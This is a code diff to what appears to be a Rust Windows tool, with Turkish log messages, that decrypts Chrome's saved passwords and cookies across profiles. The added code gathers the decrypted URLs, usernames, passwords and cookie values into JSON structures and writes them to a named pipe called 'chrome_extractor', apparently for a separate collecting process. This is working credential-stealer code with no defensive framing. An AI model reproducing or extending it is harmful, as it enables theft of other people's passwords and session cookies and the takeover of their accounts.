@@ -1,3 +1,5 @@
+use serde::{Deserialize, Serialize};
+use serde_json::Value;
 use std::fs;
 use std::io::Write;
 use std::path::{Path, PathBuf};
@@ -5,7 +7,26 @@ use std::ptr;
 use std::thread;
 use std::time::{SystemTime, UNIX_EPOCH};
 
-use serde_json::Value;
+#[derive(Serialize, Deserialize, Debug)]
+struct PasswordData {
+    url: String,
+    username: String,
+    password: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct CookieData {
+    host: String,
+    name: String,
+    value: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct ProfileData {
+    name: String,
+    passwords: Vec<PasswordData>,
+    cookies: Vec<CookieData>,
+}
 use winapi::{
     shared::{
         guiddef::GUID,
@@ -226,6 +247,8 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
     profiles.sort_by_key(|s| if s == "Default" { 0 } else { s[8..].parse::<u32>().unwrap_or(999) });
     let _ = log_message(&format!("Bulunan profil sayısı: {}", profiles.len()));
 
+    let mut collected_profiles = Vec::new();
+
     for profile in profiles {
         let profile_path = chrome_data_path.join(&profile);
         let profile_output_path = desktop_db_path.join(&profile);
@@ -233,6 +256,12 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
 
         let mut results_file = fs::File::create(profile_output_path.join("decrypted_data.txt"))?;
         let _ = writeln!(results_file, "=== Profil: {} ===", profile);
+
+        let mut profile_data = ProfileData {
+            name: profile.clone(),
+            passwords: Vec::new(),
+            cookies: Vec::new(),
+        };
 
         // Passwords Extraction
         let login_db = profile_path.join("Login Data");
@@ -250,7 +279,13 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                                     let key = if blob.starts_with(b"v20") { &v20_key } else { &v10_key };
                                     if !key.is_empty() {
                                         let dec = aes_gcm_decrypt(key, &blob).unwrap_or_else(|_| b"[Decryption Failed]".to_vec());
-                                        let _ = writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&dec));
+                                        let pass_str = String::from_utf8_lossy(&dec).to_string();
+                                        let _ = writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, pass_str);
+                                        profile_data.passwords.push(PasswordData {
+                                            url,
+                                            username: user,
+                                            password: pass_str,
+                                        });
                                     }
                                 }
                             }
@@ -279,7 +314,13 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                                     if !key.is_empty() {
                                         if let Ok(dec) = aes_gcm_decrypt(key, &blob) {
                                             let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec[..] };
-                                            let _ = writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(val));
+                                            let val_str = String::from_utf8_lossy(val).to_string();
+                                            let _ = writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, val_str);
+                                            profile_data.cookies.push(CookieData {
+                                                host,
+                                                name,
+                                                value: val_str,
+                                            });
                                         }
                                     }
                                 }
@@ -289,6 +330,47 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                 }
                 let _ = fs::remove_file(temp_db);
             }
+        }
+        collected_profiles.push(profile_data);
+    }
+
+    // Send data over Named Pipe
+    unsafe {
+        use std::os::windows::ffi::OsStrExt;
+        let pipe_name: Vec<u16> = std::ffi::OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
+
+        let mut pipe_handle = winapi::um::handleapi::INVALID_HANDLE_VALUE;
+        for _ in 0..10 {
+            pipe_handle = winapi::um::fileapi::CreateFileW(
+                pipe_name.as_ptr(),
+                winapi::um::winnt::GENERIC_WRITE,
+                0,
+                ptr::null_mut(),
+                winapi::um::fileapi::OPEN_EXISTING,
+                0,
+                ptr::null_mut(),
+            );
+            if pipe_handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(100));
+        }
+
+        if pipe_handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
+            if let Ok(serialized) = serde_json::to_vec(&collected_profiles) {
+                let mut bytes_written: u32 = 0;
+                winapi::um::fileapi::WriteFile(
+                    pipe_handle,
+                    serialized.as_ptr() as *const _,
+                    serialized.len() as u32,
+                    &mut bytes_written,
+                    ptr::null_mut(),
+                );
+            }
+            winapi::um::handleapi::CloseHandle(pipe_handle);
+            let _ = log_message("Profil verileri Named Pipe üzerinden gönderildi.");
+        } else {
+            let _ = log_message(&format!("Named Pipe'a bağlanılamadı: {}", winapi::um::errhandlingapi::GetLastError()));
         }
     }
     let _ = log_message("İşlem başarıyla tamamlandı.");
